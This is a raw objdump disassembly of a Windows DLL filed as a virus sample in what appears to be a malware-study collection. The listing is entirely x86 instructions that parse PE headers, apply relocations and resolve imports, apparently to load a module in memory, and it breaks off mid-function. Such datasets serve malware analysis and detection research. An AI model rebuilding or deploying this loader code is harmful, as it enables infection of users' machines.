
malware_samples/virus/db4f20e12c2cf32544ea4b11ff2456b29afa63607e663ac2dda42b0c5da469a1.dll:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	89 e5                	mov    %esp,%ebp
  401003:	83 ec 10             	sub    $0x10,%esp
  401006:	8b 45 08             	mov    0x8(%ebp),%eax
  401009:	8d 0d 14 30 40 00    	lea    0x403014,%ecx
  40100f:	31 d2                	xor    %edx,%edx
  401011:	89 0c 24             	mov    %ecx,(%esp)
  401014:	c7 44 24 04 00 00 00 	movl   $0x0,0x4(%esp)
  40101b:	00 
  40101c:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40101f:	89 55 f8             	mov    %edx,-0x8(%ebp)
  401022:	e8 5c 0c 00 00       	call   0x401c83
  401027:	89 e1                	mov    %esp,%ecx
  401029:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40102c:	89 51 04             	mov    %edx,0x4(%ecx)
  40102f:	89 01                	mov    %eax,(%ecx)
  401031:	e8 b0 14 00 00       	call   0x4024e6
  401036:	83 c4 10             	add    $0x10,%esp
  401039:	5d                   	pop    %ebp
  40103a:	c3                   	ret
  40103b:	55                   	push   %ebp
  40103c:	89 e5                	mov    %esp,%ebp
  40103e:	83 ec 08             	sub    $0x8,%esp
  401041:	89 e0                	mov    %esp,%eax
  401043:	c7 40 04 00 00 00 00 	movl   $0x0,0x4(%eax)
  40104a:	c7 00 00 30 40 00    	movl   $0x403000,(%eax)
  401050:	e8 2e 0c 00 00       	call   0x401c83
  401055:	83 c4 08             	add    $0x8,%esp
  401058:	5d                   	pop    %ebp
  401059:	c3                   	ret
  40105a:	55                   	push   %ebp
  40105b:	89 e5                	mov    %esp,%ebp
  40105d:	83 ec 08             	sub    $0x8,%esp
  401060:	8b 45 08             	mov    0x8(%ebp),%eax
  401063:	8b 40 38             	mov    0x38(%eax),%eax
  401066:	89 e1                	mov    %esp,%ecx
  401068:	89 41 04             	mov    %eax,0x4(%ecx)
  40106b:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  401071:	e8 0d 0c 00 00       	call   0x401c83
  401076:	83 c4 08             	add    $0x8,%esp
  401079:	5d                   	pop    %ebp
  40107a:	c3                   	ret
  40107b:	55                   	push   %ebp
  40107c:	89 e5                	mov    %esp,%ebp
  40107e:	56                   	push   %esi
  40107f:	83 ec 14             	sub    $0x14,%esp
  401082:	8b 45 08             	mov    0x8(%ebp),%eax
  401085:	89 04 24             	mov    %eax,(%esp)
  401088:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40108b:	e8 c0 0d 00 00       	call   0x401e50
  401090:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  401093:	8b 51 50             	mov    0x50(%ecx),%edx
  401096:	8b 71 28             	mov    0x28(%ecx),%esi
  401099:	89 34 24             	mov    %esi,(%esp)
  40109c:	89 54 24 04          	mov    %edx,0x4(%esp)
  4010a0:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4010a3:	e8 5b 11 00 00       	call   0x402203
  4010a8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4010ab:	89 04 24             	mov    %eax,(%esp)
  4010ae:	e8 dd 11 00 00       	call   0x402290
  4010b3:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4010b6:	89 0c 24             	mov    %ecx,(%esp)
  4010b9:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4010bc:	e8 dd 10 00 00       	call   0x40219e
  4010c1:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4010c4:	89 04 24             	mov    %eax,(%esp)
  4010c7:	e8 c2 06 00 00       	call   0x40178e
  4010cc:	31 c0                	xor    %eax,%eax
  4010ce:	83 c4 14             	add    $0x14,%esp
  4010d1:	5e                   	pop    %esi
  4010d2:	5d                   	pop    %ebp
  4010d3:	c3                   	ret
  4010d4:	55                   	push   %ebp
  4010d5:	89 e5                	mov    %esp,%ebp
  4010d7:	53                   	push   %ebx
  4010d8:	57                   	push   %edi
  4010d9:	56                   	push   %esi
  4010da:	83 ec 74             	sub    $0x74,%esp
  4010dd:	8b 45 0c             	mov    0xc(%ebp),%eax
  4010e0:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4010e3:	8b 10                	mov    (%eax),%edx
  4010e5:	8b 71 3c             	mov    0x3c(%ecx),%esi
  4010e8:	66 89 f7             	mov    %si,%di
  4010eb:	66 81 ff 00 00       	cmp    $0x0,%di
  4010f0:	89 cb                	mov    %ecx,%ebx
  4010f2:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4010f5:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  4010f8:	89 55 e8             	mov    %edx,-0x18(%ebp)
  4010fb:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4010fe:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  401101:	0f 84 4f 02 00 00    	je     0x401356
  401107:	e9 4b 01 00 00       	jmp    0x401257
  40110c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40110f:	05 02 00 00 00       	add    $0x2,%eax
  401114:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  401117:	01 c1                	add    %eax,%ecx
  401119:	89 e0                	mov    %esp,%eax
  40111b:	89 48 04             	mov    %ecx,0x4(%eax)
  40111e:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  401121:	89 08                	mov    %ecx,(%eax)
  401123:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  401126:	ff d0                	call   *%eax
  401128:	83 ec 08             	sub    $0x8,%esp
  40112b:	b9 66 00 00 00       	mov    $0x66,%ecx
  401130:	39 c8                	cmp    %ecx,%eax
  401132:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401135:	0f 87 6d 01 00 00    	ja     0x4012a8
  40113b:	b8 01 00 00 00       	mov    $0x1,%eax
  401140:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401143:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  401149:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40114c:	eb 7f                	jmp    0x4011cd
  40114e:	8b 45 c4             	mov    -0x3c(%ebp),%eax
  401151:	05 04 00 00 00       	add    $0x4,%eax
  401156:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  401159:	81 c1 04 00 00 00    	add    $0x4,%ecx
  40115f:	8b 55 c4             	mov    -0x3c(%ebp),%edx
  401162:	8b 72 04             	mov    0x4(%edx),%esi
  401165:	81 fe 00 00 00 00    	cmp    $0x0,%esi
  40116b:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  40116e:	89 75 bc             	mov    %esi,-0x44(%ebp)
  401171:	89 45 b8             	mov    %eax,-0x48(%ebp)
  401174:	74 35                	je     0x4011ab
  401176:	e9 a8 01 00 00       	jmp    0x401323
  40117b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40117e:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  401181:	01 c8                	add    %ecx,%eax
  401183:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401186:	8b 75 b0             	mov    -0x50(%ebp),%esi
  401189:	01 f2                	add    %esi,%edx
  40118b:	89 45 ac             	mov    %eax,-0x54(%ebp)
  40118e:	89 55 a8             	mov    %edx,-0x58(%ebp)
  401191:	e9 e0 00 00 00       	jmp    0x401276
  401196:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401199:	8b 4d b4             	mov    -0x4c(%ebp),%ecx
  40119c:	01 c8                	add    %ecx,%eax
  40119e:	89 c2                	mov    %eax,%edx
  4011a0:	89 55 ac             	mov    %edx,-0x54(%ebp)
  4011a3:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4011a6:	e9 cb 00 00 00       	jmp    0x401276
  4011ab:	31 c0                	xor    %eax,%eax
  4011ad:	8b 4d a4             	mov    -0x5c(%ebp),%ecx
  4011b0:	81 c1 14 00 00 00    	add    $0x14,%ecx
  4011b6:	8b 55 a4             	mov    -0x5c(%ebp),%edx
  4011b9:	8b 72 20             	mov    0x20(%edx),%esi
  4011bc:	81 fe 00 00 00 00    	cmp    $0x0,%esi
  4011c2:	89 4d a0             	mov    %ecx,-0x60(%ebp)
  4011c5:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4011c8:	89 75 9c             	mov    %esi,-0x64(%ebp)
  4011cb:	75 3a                	jne    0x401207
  4011cd:	8b 45 c8             	mov    -0x38(%ebp),%eax
  4011d0:	83 c4 74             	add    $0x74,%esp
  4011d3:	5e                   	pop    %esi
  4011d4:	5f                   	pop    %edi
  4011d5:	5b                   	pop    %ebx
  4011d6:	5d                   	pop    %ebp
  4011d7:	c3                   	ret
  4011d8:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4011db:	25 ff ff 00 00       	and    $0xffff,%eax
  4011e0:	89 e1                	mov    %esp,%ecx
  4011e2:	89 41 04             	mov    %eax,0x4(%ecx)
  4011e5:	8b 45 d8             	mov    -0x28(%ebp),%eax
  4011e8:	89 01                	mov    %eax,(%ecx)
  4011ea:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  4011ed:	ff d1                	call   *%ecx
  4011ef:	83 ec 08             	sub    $0x8,%esp
  4011f2:	b9 66 00 00 00       	mov    $0x66,%ecx
  4011f7:	39 c8                	cmp    %ecx,%eax
  4011f9:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4011fc:	0f 87 a6 00 00 00    	ja     0x4012a8
  401202:	e9 34 ff ff ff       	jmp    0x40113b
  401207:	8b 45 9c             	mov    -0x64(%ebp),%eax
  40120a:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  40120d:	8b 55 ec             	mov    -0x14(%ebp),%edx
  401210:	01 c2                	add    %eax,%edx
  401212:	89 e0                	mov    %esp,%eax
  401214:	89 10                	mov    %edx,(%eax)
  401216:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401219:	89 4d a4             	mov    %ecx,-0x5c(%ebp)
  40121c:	ff d0                	call   *%eax
  40121e:	83 ec 04             	sub    $0x4,%esp
  401221:	b9 01 00 00 00       	mov    $0x1,%ecx
  401226:	3d 00 00 00 00       	cmp    $0x0,%eax
  40122b:	89 45 d8             	mov    %eax,-0x28(%ebp)
  40122e:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  401231:	74 9a                	je     0x4011cd
  401233:	e9 90 00 00 00       	jmp    0x4012c8
  401238:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40123b:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  40123e:	01 c8                	add    %ecx,%eax
  401240:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401243:	81 c2 08 00 00 00    	add    $0x8,%edx
  401249:	8b 75 94             	mov    -0x6c(%ebp),%esi
  40124c:	89 55 90             	mov    %edx,-0x70(%ebp)
  40124f:	89 45 a0             	mov    %eax,-0x60(%ebp)
  401252:	89 75 9c             	mov    %esi,-0x64(%ebp)
  401255:	eb b0                	jmp    0x401207
  401257:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  40125a:	05 ff ff 00 00       	add    $0xffff,%eax
  40125f:	25 ff ff 00 00       	and    $0xffff,%eax
  401264:	05 01 00 00 00       	add    $0x1,%eax
  401269:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40126c:	01 c1                	add    %eax,%ecx
  40126e:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  401271:	e9 e0 00 00 00       	jmp    0x401356
  401276:	8b 45 a8             	mov    -0x58(%ebp),%eax
  401279:	8b 4d ac             	mov    -0x54(%ebp),%ecx
  40127c:	8b 10                	mov    (%eax),%edx
  40127e:	81 fa 00 00 00 00    	cmp    $0x0,%edx
  401284:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  401287:	89 55 bc             	mov    %edx,-0x44(%ebp)
  40128a:	89 45 b8             	mov    %eax,-0x48(%ebp)
  40128d:	0f 84 18 ff ff ff    	je     0x4011ab
  401293:	e9 8b 00 00 00       	jmp    0x401323
  401298:	8a 45 8f             	mov    -0x71(%ebp),%al
  40129b:	a8 01                	test   $0x1,%al
  40129d:	0f 85 98 fe ff ff    	jne    0x40113b
  4012a3:	e9 64 fe ff ff       	jmp    0x40110c
  4012a8:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4012ab:	b9 01 00 00 00       	mov    $0x1,%ecx
  4012b0:	8b 55 cc             	mov    -0x34(%ebp),%edx
  4012b3:	89 02                	mov    %eax,(%edx)
  4012b5:	3d 00 00 00 00       	cmp    $0x0,%eax
  4012ba:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  4012bd:	0f 84 0a ff ff ff    	je     0x4011cd
  4012c3:	e9 86 fe ff ff       	jmp    0x40114e
  4012c8:	8b 45 a4             	mov    -0x5c(%ebp),%eax
  4012cb:	8b 08                	mov    (%eax),%ecx
  4012cd:	8b 50 10             	mov    0x10(%eax),%edx
  4012d0:	81 f9 00 00 00 00    	cmp    $0x0,%ecx
  4012d6:	89 4d b0             	mov    %ecx,-0x50(%ebp)
  4012d9:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  4012dc:	0f 84 b4 fe ff ff    	je     0x401196
  4012e2:	e9 94 fe ff ff       	jmp    0x40117b
  4012e7:	8a 45 8f             	mov    -0x71(%ebp),%al
  4012ea:	a8 01                	test   $0x1,%al
  4012ec:	0f 85 49 fe ff ff    	jne    0x40113b
  4012f2:	e9 e1 fe ff ff       	jmp    0x4011d8
  4012f7:	31 c0                	xor    %eax,%eax
  4012f9:	8b 4d 88             	mov    -0x78(%ebp),%ecx
  4012fc:	8b 91 80 00 00 00    	mov    0x80(%ecx),%edx
  401302:	8b 75 ec             	mov    -0x14(%ebp),%esi
  401305:	8b 7c 16 0c          	mov    0xc(%esi,%edx,1),%edi
  401309:	81 ff 00 00 00 00    	cmp    $0x0,%edi
  40130f:	89 7d 94             	mov    %edi,-0x6c(%ebp)
  401312:	89 55 98             	mov    %edx,-0x68(%ebp)
  401315:	89 45 c8             	mov    %eax,-0x38(%ebp)
  401318:	0f 84 af fe ff ff    	je     0x4011cd
  40131e:	e9 15 ff ff ff       	jmp    0x401238
  401323:	8b 45 b8             	mov    -0x48(%ebp),%eax
  401326:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  401329:	8b 55 bc             	mov    -0x44(%ebp),%edx
  40132c:	8b 75 90             	mov    -0x70(%ebp),%esi
  40132f:	8b 3e                	mov    (%esi),%edi
  401331:	81 ff 00 00 00 00    	cmp    $0x0,%edi
  401337:	0f 94 c3             	sete   %bl
  40133a:	81 fa 00 00 00 00    	cmp    $0x0,%edx
  401340:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  401343:	89 4d cc             	mov    %ecx,-0x34(%ebp)
  401346:	89 55 dc             	mov    %edx,-0x24(%ebp)
  401349:	89 7d d4             	mov    %edi,-0x2c(%ebp)
  40134c:	88 5d 8f             	mov    %bl,-0x71(%ebp)
  40134f:	7c 96                	jl     0x4012e7
  401351:	e9 42 ff ff ff       	jmp    0x401298
  401356:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401359:	31 c9                	xor    %ecx,%ecx
  40135b:	81 b8 84 00 00 00 00 	cmpl   $0x0,0x84(%eax)
  401362:	00 00 00 
  401365:	89 45 88             	mov    %eax,-0x78(%ebp)
  401368:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  40136b:	0f 84 5c fe ff ff    	je     0x4011cd
  401371:	eb 84                	jmp    0x4012f7
  401373:	55                   	push   %ebp
  401374:	89 e5                	mov    %esp,%ebp
  401376:	57                   	push   %edi
  401377:	56                   	push   %esi
  401378:	83 ec 34             	sub    $0x34,%esp
  40137b:	8b 45 0c             	mov    0xc(%ebp),%eax
  40137e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401381:	8b 50 3c             	mov    0x3c(%eax),%edx
  401384:	66 89 d6             	mov    %dx,%si
  401387:	66 81 fe 00 00       	cmp    $0x0,%si
  40138c:	89 c7                	mov    %eax,%edi
  40138e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  401391:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401394:	89 55 ec             	mov    %edx,-0x14(%ebp)
  401397:	89 7d e8             	mov    %edi,-0x18(%ebp)
  40139a:	0f 84 ae 00 00 00    	je     0x40144e
  4013a0:	eb 6d                	jmp    0x40140f
  4013a2:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4013a5:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4013a8:	89 c2                	mov    %eax,%edx
  4013aa:	81 c2 28 00 00 00    	add    $0x28,%edx
  4013b0:	81 c1 01 00 00 00    	add    $0x1,%ecx
  4013b6:	8b 75 f0             	mov    -0x10(%ebp),%esi
  4013b9:	03 70 0c             	add    0xc(%eax),%esi
  4013bc:	8b 7d f4             	mov    -0xc(%ebp),%edi
  4013bf:	03 78 14             	add    0x14(%eax),%edi
  4013c2:	8b 40 10             	mov    0x10(%eax),%eax
  4013c5:	89 34 24             	mov    %esi,(%esp)
  4013c8:	89 7c 24 04          	mov    %edi,0x4(%esp)
  4013cc:	89 44 24 08          	mov    %eax,0x8(%esp)
  4013d0:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  4013d3:	89 55 d8             	mov    %edx,-0x28(%ebp)
  4013d6:	e8 45 10 00 00       	call   0x402420
  4013db:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  4013de:	0f b7 08             	movzwl (%eax),%ecx
  4013e1:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4013e4:	39 ca                	cmp    %ecx,%edx
  4013e6:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4013e9:	89 55 e0             	mov    %edx,-0x20(%ebp)
  4013ec:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  4013ef:	72 b1                	jb     0x4013a2
  4013f1:	eb 38                	jmp    0x40142b
  4013f3:	31 c0                	xor    %eax,%eax
  4013f5:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  4013f8:	81 c1 18 00 00 00    	add    $0x18,%ecx
  4013fe:	8b 55 d0             	mov    -0x30(%ebp),%edx
  401401:	0f b7 72 14          	movzwl 0x14(%edx),%esi
  401405:	01 f1                	add    %esi,%ecx
  401407:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40140a:	89 4d e4             	mov    %ecx,-0x1c(%ebp)
  40140d:	eb 93                	jmp    0x4013a2
  40140f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  401412:	05 ff ff 00 00       	add    $0xffff,%eax
  401417:	25 ff ff 00 00       	and    $0xffff,%eax
  40141c:	05 01 00 00 00       	add    $0x1,%eax
  401421:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401424:	01 c1                	add    %eax,%ecx
  401426:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  401429:	eb 23                	jmp    0x40144e
  40142b:	8b 45 d0             	mov    -0x30(%ebp),%eax
  40142e:	8b 48 54             	mov    0x54(%eax),%ecx
  401431:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401434:	89 14 24             	mov    %edx,(%esp)
  401437:	8b 75 f4             	mov    -0xc(%ebp),%esi
  40143a:	89 74 24 04          	mov    %esi,0x4(%esp)
  40143e:	89 4c 24 08          	mov    %ecx,0x8(%esp)
  401442:	e8 d9 0f 00 00       	call   0x402420
  401447:	83 c4 34             	add    $0x34,%esp
  40144a:	5e                   	pop    %esi
  40144b:	5f                   	pop    %edi
  40144c:	5d                   	pop    %ebp
  40144d:	c3                   	ret
  40144e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401451:	89 c1                	mov    %eax,%ecx
  401453:	81 c1 06 00 00 00    	add    $0x6,%ecx
  401459:	66 81 78 06 00 00    	cmpw   $0x0,0x6(%eax)
  40145f:	89 45 d0             	mov    %eax,-0x30(%ebp)
  401462:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  401465:	74 c4                	je     0x40142b
  401467:	eb 8a                	jmp    0x4013f3
  401469:	55                   	push   %ebp
  40146a:	89 e5                	mov    %esp,%ebp
  40146c:	b8 01 00 00 00       	mov    $0x1,%eax
  401471:	5d                   	pop    %ebp
  401472:	c3                   	ret
  401473:	55                   	push   %ebp
  401474:	89 e5                	mov    %esp,%ebp
  401476:	83 ec 08             	sub    $0x8,%esp
  401479:	8b 45 08             	mov    0x8(%ebp),%eax
  40147c:	89 e1                	mov    %esp,%ecx
  40147e:	89 01                	mov    %eax,(%ecx)
  401480:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  401487:	e8 f7 07 00 00       	call   0x401c83
  40148c:	83 c4 08             	add    $0x8,%esp
  40148f:	5d                   	pop    %ebp
  401490:	c3                   	ret
  401491:	55                   	push   %ebp
  401492:	89 e5                	mov    %esp,%ebp
  401494:	56                   	push   %esi
  401495:	83 ec 1c             	sub    $0x1c,%esp
  401498:	8b 45 10             	mov    0x10(%ebp),%eax
  40149b:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40149e:	8b 55 08             	mov    0x8(%ebp),%edx
  4014a1:	8b 52 08             	mov    0x8(%edx),%edx
  4014a4:	81 fa 00 00 00 00    	cmp    $0x0,%edx
  4014aa:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4014ad:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  4014b0:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4014b3:	74 37                	je     0x4014ec
  4014b5:	89 e0                	mov    %esp,%eax
  4014b7:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  4014ba:	89 48 04             	mov    %ecx,0x4(%eax)
  4014bd:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4014c0:	89 10                	mov    %edx,(%eax)
  4014c2:	8b 45 f0             	mov    -0x10(%ebp),%eax
  4014c5:	ff d0                	call   *%eax
  4014c7:	83 ec 08             	sub    $0x8,%esp
  4014ca:	b9 66 00 00 00       	mov    $0x66,%ecx
  4014cf:	31 d2                	xor    %edx,%edx
  4014d1:	89 c6                	mov    %eax,%esi
  4014d3:	39 c8                	cmp    %ecx,%eax
  4014d5:	89 55 ec             	mov    %edx,-0x14(%ebp)
  4014d8:	89 75 e8             	mov    %esi,-0x18(%ebp)
  4014db:	77 06                	ja     0x4014e3
  4014dd:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4014e0:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4014e3:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4014e6:	83 c4 1c             	add    $0x1c,%esp
  4014e9:	5e                   	pop    %esi
  4014ea:	5d                   	pop    %ebp
  4014eb:	c3                   	ret
  4014ec:	31 c0                	xor    %eax,%eax
  4014ee:	83 c4 1c             	add    $0x1c,%esp
  4014f1:	5e                   	pop    %esi
  4014f2:	5d                   	pop    %ebp
  4014f3:	c3                   	ret
  4014f4:	55                   	push   %ebp
  4014f5:	89 e5                	mov    %esp,%ebp
  4014f7:	53                   	push   %ebx
  4014f8:	57                   	push   %edi
  4014f9:	56                   	push   %esi
  4014fa:	83 ec 7c             	sub    $0x7c,%esp
  4014fd:	8b 45 0c             	mov    0xc(%ebp),%eax
  401500:	8b 4d 08             	mov    0x8(%ebp),%ecx
  401503:	8b 51 3c             	mov    0x3c(%ecx),%edx
  401506:	66 89 d6             	mov    %dx,%si
  401509:	66 81 fe 00 00       	cmp    $0x0,%si
  40150e:	89 cf                	mov    %ecx,%edi
  401510:	89 45 f0             	mov    %eax,-0x10(%ebp)
  401513:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  401516:	89 55 e8             	mov    %edx,-0x18(%ebp)
  401519:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40151c:	0f 84 1b 01 00 00    	je     0x40163d
  401522:	e9 d6 01 00 00       	jmp    0x4016fd
  401527:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40152a:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40152d:	01 c8                	add    %ecx,%eax
  40152f:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401532:	8b 75 ec             	mov    -0x14(%ebp),%esi
  401535:	03 14 06             	add    (%esi,%eax,1),%edx
  401538:	89 14 06             	mov    %edx,(%esi,%eax,1)
  40153b:	e9 21 02 00 00       	jmp    0x401761
  401540:	8b 45 e0             	mov    -0x20(%ebp),%eax
  401543:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  401546:	01 c8                	add    %ecx,%eax
  401548:	8b 55 ec             	mov    -0x14(%ebp),%edx
  40154b:	8b 34 02             	mov    (%edx,%eax,1),%esi
  40154e:	8b 7c 02 04          	mov    0x4(%edx,%eax,1),%edi
  401552:	8b 5d d8             	mov    -0x28(%ebp),%ebx
  401555:	01 de                	add    %ebx,%esi
  401557:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40155a:	11 cf                	adc    %ecx,%edi
  40155c:	89 34 02             	mov    %esi,(%edx,%eax,1)
  40155f:	89 7c 02 04          	mov    %edi,0x4(%edx,%eax,1)
  401563:	e9 f9 01 00 00       	jmp    0x401761
  401568:	b8 01 00 00 00       	mov    $0x1,%eax
  40156d:	8b 4d d0             	mov    -0x30(%ebp),%ecx
  401570:	81 f9 00 00 00 00    	cmp    $0x0,%ecx
  401576:	0f 9f c2             	setg   %dl
  401579:	8b 75 cc             	mov    -0x34(%ebp),%esi
  40157c:	8b be a0 00 00 00    	mov    0xa0(%esi),%edi
  401582:	89 fb                	mov    %edi,%ebx
  401584:	81 c3 04 00 00 00    	add    $0x4,%ebx
  40158a:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  40158d:	01 d9                	add    %ebx,%ecx
  40158f:	8b 5d ec             	mov    -0x14(%ebp),%ebx
  401592:	8b 74 3b 04          	mov    0x4(%ebx,%edi,1),%esi
  401596:	81 fe 00 00 00 00    	cmp    $0x0,%esi
  40159c:	0f 95 c6             	setne  %dh
  40159f:	20 f2                	and    %dh,%dl
  4015a1:	f6 c2 01             	test   $0x1,%dl
  4015a4:	89 4d c8             	mov    %ecx,-0x38(%ebp)
  4015a7:	89 7d c4             	mov    %edi,-0x3c(%ebp)
  4015aa:	89 75 c0             	mov    %esi,-0x40(%ebp)
  4015ad:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4015b0:	75 05                	jne    0x4015b7
  4015b2:	e9 cc 01 00 00       	jmp    0x401783
  4015b7:	31 c0                	xor    %eax,%eax
  4015b9:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4015bc:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4015bf:	8b 75 c4             	mov    -0x3c(%ebp),%esi
  4015c2:	01 f2                	add    %esi,%edx
  4015c4:	8b 7d d0             	mov    -0x30(%ebp),%edi
  4015c7:	8b 5d c8             	mov    -0x38(%ebp),%ebx
  4015ca:	8b 75 c0             	mov    -0x40(%ebp),%esi
  4015cd:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4015d0:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4015d3:	89 7d b8             	mov    %edi,-0x48(%ebp)
  4015d6:	89 75 b4             	mov    %esi,-0x4c(%ebp)
  4015d9:	89 55 b0             	mov    %edx,-0x50(%ebp)
  4015dc:	89 5d ac             	mov    %ebx,-0x54(%ebp)
  4015df:	e9 48 01 00 00       	jmp    0x40172c
  4015e4:	b8 01 00 00 00       	mov    $0x1,%eax
  4015e9:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  4015ec:	8b 11                	mov    (%ecx),%edx
  4015ee:	8b 75 a4             	mov    -0x5c(%ebp),%esi
  4015f1:	29 d6                	sub    %edx,%esi
  4015f3:	8b 7d a0             	mov    -0x60(%ebp),%edi
  4015f6:	01 d7                	add    %edx,%edi
  4015f8:	89 d3                	mov    %edx,%ebx
  4015fa:	81 c3 04 00 00 00    	add    $0x4,%ebx
  401600:	8b 4d a0             	mov    -0x60(%ebp),%ecx
  401603:	01 d9                	add    %ebx,%ecx
  401605:	8b 5d a0             	mov    -0x60(%ebp),%ebx
  401608:	8b 54 13 04          	mov    0x4(%ebx,%edx,1),%edx
  40160c:	81 fa 00 00 00 00    	cmp    $0x0,%edx
  401612:	0f 95 c3             	setne  %bl
  401615:	81 fe 00 00 00 00    	cmp    $0x0,%esi
  40161b:	0f 9f c7             	setg   %bh
  40161e:	20 df                	and    %bl,%bh
  401620:	f6 c7 01             	test   $0x1,%bh
  401623:	89 55 b4             	mov    %edx,-0x4c(%ebp)
  401626:	89 75 b8             	mov    %esi,-0x48(%ebp)
  401629:	89 4d ac             	mov    %ecx,-0x54(%ebp)
  40162c:	89 7d b0             	mov    %edi,-0x50(%ebp)
  40162f:	89 45 bc             	mov    %eax,-0x44(%ebp)
  401632:	0f 85 f4 00 00 00    	jne    0x40172c
  401638:	e9 46 01 00 00       	jmp    0x401783
  40163d:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401640:	b9 01 00 00 00       	mov    $0x1,%ecx
  401645:	8b 55 f0             	mov    -0x10(%ebp),%edx
  401648:	81 fa 00 00 00 00    	cmp    $0x0,%edx
  40164e:	89 45 cc             	mov    %eax,-0x34(%ebp)
  401651:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  401654:	0f 84 29 01 00 00    	je     0x401783
  40165a:	eb 63                	jmp    0x4016bf
  40165c:	8b 45 9c             	mov    -0x64(%ebp),%eax
  40165f:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  401662:	31 d2                	xor    %edx,%edx
  401664:	48                   	dec    %eax
  401665:	0f b7 31             	movzwl (%ecx),%esi
  401668:	89 f7                	mov    %esi,%edi
  40166a:	c1 ef 0c             	shr    $0xc,%edi
  40166d:	81 e6 ff 0f 00 00    	and    $0xfff,%esi
  401673:	31 db                	xor    %ebx,%ebx
  401675:	85 ff                	test   %edi,%edi
  401677:	89 55 94             	mov    %edx,-0x6c(%ebp)
  40167a:	89 4d 90             	mov    %ecx,-0x70(%ebp)
